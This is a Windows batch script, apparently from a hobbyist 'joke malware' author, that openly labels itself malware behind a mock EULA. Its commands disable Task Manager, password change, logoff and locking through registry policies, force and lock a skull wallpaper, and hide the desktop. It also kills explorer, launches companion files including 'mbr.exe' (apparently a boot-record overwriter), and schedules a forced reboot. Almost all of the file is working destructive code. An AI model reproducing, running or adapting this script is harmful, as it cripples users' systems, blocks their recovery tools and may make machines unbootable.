@echo off
title Windows 11 Death Edition.exe
echo Created by pankoza
echo Check my github: [96mhttps://github.com/pankoza-pl
echo.
echo [31mWARNING![0m This is a malware, not a joke
pause
cls
title EULA
echo By installing this software the creator take no responsibility
echo for any damage or loss, the software has no warranty.
echo.
echo If you are a content creator and you want to create content
echo you have to give credit to the author.
echo.
echo This software is not created for malicious purposes. 
echo.
echo DO YOU AGREED THE EULA?
pause
cls
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f
copy /y skulls.bmp c:\
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d c:\skulls.bmp /f
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
start RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
reg.exe ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop /v NoChangingWallPaper /t REG_DWORD /d 1 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoDesktop /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
start userinit
start mbr.exe
start bgm.exe
start escape.vbs
shutdown /r /t 200 /c "There is no escaping Windows 11 Death Edition :)"